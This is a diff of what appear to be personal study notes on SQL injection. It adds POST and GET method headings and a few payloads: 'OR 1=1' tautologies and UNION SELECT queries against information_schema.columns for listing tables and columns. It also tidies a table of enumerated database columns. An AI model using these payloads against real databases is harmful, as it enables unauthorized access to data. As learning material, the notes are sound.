@@ -464,7 +464,7 @@ Can be found using a Single Quote => '
 - May show no errors or 
 
 
-
+# POST Method (Interacting with input fields)
 
 
 step 1: Determine the vulnerable field
@@ -505,7 +505,7 @@ session |	session_log 	session_id| 	5
 session |	session_log 	user_id 	5
 session |	session_log 	remote_ip 	5
 session |	session_log 	status 		5
-session |	session_log 	start 		5		5
+session |	session_log 	start 		5		
 session |	session_log 	last_access| 	5
 session |	user 		id 		5
 session |	user 		name 		5
@@ -520,6 +520,21 @@ session |	userinfo 	prid 		5
 
 
 
+# GET Method (Interact with URL)
+
+- Choose {option} from radio button, then click submit
+  - interact with url:
+```
+
+```
+
+Section=4 OR 1=1 (for each selection 1..4)
+
+Selection=2 UNION, SELECT 1,2,3
+
+UNION SELECT table_schema,table_name,column_name from information_schema.columns
+
+UNION SELECT table_schema,column_name,table_name from information_schema.columns
 
 
 
